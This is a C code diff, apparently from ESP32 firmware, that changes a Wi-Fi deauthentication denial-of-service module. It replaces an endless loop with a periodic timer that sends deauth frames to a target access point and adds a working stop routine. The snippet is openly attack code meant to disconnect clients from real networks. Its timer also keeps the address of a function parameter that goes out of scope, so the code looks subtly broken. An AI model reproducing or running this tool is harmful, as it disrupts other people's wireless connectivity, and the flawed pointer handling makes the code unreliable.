@@ -10,10 +10,10 @@
 #include "nvs_flash.h"
 #include "esp_timer.h"
 
-
 static const char *TAG = "main:attack_dos";
 static bool wifi_iniciado = false;
 static int wifi_mode = -1;
+static esp_timer_handle_t deauth_timer_handle;
 
 static const uint8_t deauth_frame_template[] = {
     0xc0, 0x00, 0x3a, 0x01,
@@ -31,13 +31,17 @@ void attack_dos_start(wifi_ap_record_t ap_record) {
     ESP_LOGI(TAG, "Starting DoS attack...");
 
     iniciar_wifi(TAG, WIFI_MODE_AP);
-    while (true) {
-        send_deauth_frame(ap_record);
-    }
+    const esp_timer_create_args_t deauth_timer_args = {
+	.callback = &send_deauth_frame,
+	.arg = (void *)&ap_record
+    };
+    ESP_ERROR_CHECK(esp_timer_create(&deauth_timer_args, &deauth_timer_handle));
+    ESP_ERROR_CHECK(esp_timer_start_periodic(deauth_timer_handle, 1000000));
 }
 
 void attack_dos_stop() {
-    /* no funciona por ahora :) */
+    ESP_ERROR_CHECK(esp_timer_stop(deauth_timer_handle));
+    esp_timer_delete(deauth_timer_handle);
     ESP_LOGI(TAG, "DoS attack stopped");
 }
 
